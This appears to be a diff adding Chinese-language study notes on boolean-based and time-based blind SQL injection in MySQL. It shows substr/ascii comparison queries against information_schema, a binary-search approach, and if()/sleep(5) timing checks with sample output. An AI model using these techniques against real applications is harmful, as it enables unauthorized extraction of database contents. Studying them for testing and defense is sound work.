@@ -1,0 +1,57 @@
+### 基于布尔盲注
+获取表名：
+`select table_name from information_schema.tables where table_schema=database() limit 0,1;
+`
+获取表名第一个字符：
+`select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) as xxx;`
+获取表明第一个字符的ASCII值：
+`select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) as xxx;`
+根据返回结果的真假来判断所要猜测的内容是否为真。
+
+--- 注入步骤：
+1. 获取数据库名长度`length(database())`
+2. 通过猜测数据库名的每一个字符猜测数据库名，通过比较ASCII值的大小（利用二分法减少比较次数）
+举例：当前数据库名为test
+通过下面的方法可以猜出数据库名称的第一个字母为t，依次类推可猜解处数据库名称。
+```
+mysql> select ascii(substr(database(),1,1))<115 as xxx;
++------+
+| xxx  |
++------+
+|    0 |
++------+
+1 row in set (0.00 sec)
+
+mysql> select ascii(substr(database(),1,1))<117 as xxx;
++------+
+| xxx  |
++------+
+|    1 |
++------+
+1 row in set (0.00 sec)
+```
+3. 仿照上面的方法可以分别猜测 数据表，字段，数据的具体内容。
+
+### 基于时间盲注
+首先，了解`if`的用法
+`if(expr,1,2) --- 如果expr为true，则执行1；否则，执行2`
+通过判断SQL语句的执行时间来判断所要猜测的内容是否为真。
+```
+mysql> select if(ascii(substr(database(),1,1))<117,sleep(5),null) as xxx;
+该SQL语句会等待5秒钟才会显示结果。
++------+
+| xxx  |
++------+
+|    0 |
++------+
+1 row in set (5.00 sec)
+
+mysql> select if(ascii(substr(database(),1,1))<115,sleep(5),null) as xxx;
++------+
+| xxx  |
++------+
+| NULL |
++------+
+1 row in set (0.00 sec)
+```
+借此，可以一个一个字符的猜测所需要的内容。
